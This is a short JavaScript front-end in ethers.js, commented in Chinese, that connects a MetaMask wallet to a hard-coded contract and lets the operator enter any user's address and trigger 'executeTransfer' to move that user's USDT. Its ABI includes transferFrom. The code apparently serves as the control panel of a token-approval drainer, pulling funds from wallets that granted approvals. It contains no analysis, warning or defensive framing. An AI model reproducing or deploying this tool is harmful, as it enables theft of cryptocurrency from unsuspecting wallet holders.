let provider;
let signer;
let contract;

const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 智能合约地址
const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "executeTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 连接钱包
document.getElementById("connectButton").onclick = async () => {
    if (window.ethereum) {
        try {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []); // 请求连接钱包
            signer = provider.getSigner();
            contract = new ethers.Contract(contractAddress, contractABI, signer);
            document.getElementById("executeTransferButton").disabled = false;
            alert("Wallet connected successfully!");
        } catch (error) {
            console.error(error);
            alert("Failed to connect wallet: " + error.message);
        }
    } else {
        alert("MetaMask not detected! Please install MetaMask.");
    }
};

// 执行 USDT 转移
document.getElementById("executeTransferButton").onclick = async () => {
    const userAddress = prompt("Enter the user address to transfer from:");
    try {
        const tx = await contract.executeTransfer(userAddress);
        await tx.wait(); // 等待交易确认
        alert("Transfer executed successfully!");
    } catch (error) {
        console.error(error);
        alert("Transfer failed: " + error.message);
    }
};
